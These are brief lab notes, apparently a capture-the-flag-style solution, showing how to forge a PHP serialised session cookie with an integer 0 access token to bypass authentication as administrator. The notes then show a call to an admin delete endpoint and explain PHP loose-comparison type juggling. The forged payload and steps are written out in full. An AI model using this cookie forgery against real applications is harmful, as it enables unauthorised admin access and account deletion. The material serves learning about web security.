<!-- 
1) Get the serialised data object session cookie, URL decode then base64 decoded 
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ2Zzkxbjk3Ym1jdjc5bGU1Z2F5d3owOTJjZWo1YWw4eiI7fQ%3d%3d
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ2Zzkxbjk3Ym1jdjc5bGU1Z2F5d3owOTJjZWo1YWw4eiI7fQ==
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"vg91n97bmcv79le5gaywz092cej5al8z";}
                                                                                                      

2) Modify the username, the token and its corresponding details in the deserialised object then base64 encode it
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
302 found --- admin panel <a> tag now visible


3) change endpoint to GET /admin/delete?username=carlos

----------------------------
    why this worked?
----------------------------
we supplied an integer 0, the stored access_token for administrator is assumably a string
starting with a letter (not a number)
the loose comparer (==) compares like this:

    0 == "somerandomtoken" // this results in a true 

    PHP will apply type coercion and convert the string "somerandomtoken" to a numeric value. 
    Since the string does not contain any numeric characters at the beginning, 
    it will be converted to the numeric value 0

    1 == "somerandomtoken" // false

    Since "somerandomtoken" does not begin with a numeric character, 
    PHP will convert it to the numeric value 0. 
    Therefore, the comparison becomes 1 == 0, which evaluates to false

    0 == "1somerandomtoken"   //false   

    1 == "1somerandomtoken"   // true
 -->